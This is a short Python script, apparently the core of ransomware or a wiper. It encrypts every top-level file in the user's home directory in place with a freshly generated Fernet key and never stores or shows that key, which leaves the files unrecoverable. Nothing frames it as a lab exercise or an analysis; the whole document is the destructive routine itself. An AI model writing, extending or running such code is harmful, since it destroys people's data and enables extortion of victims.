from pathlib import Path
from cryptography.fernet import Fernet

import os

home = Path.home()
files = Path(home).glob("*")
key = Fernet.generate_key()

for file in files:
    path = os.path.join(home, file)

    with open(path, "rb") as f:
        content = f.read()
    
    encrypted = Fernet(key).encrypt(content)

    with open(path, "wb") as f:
        f.write(encrypted)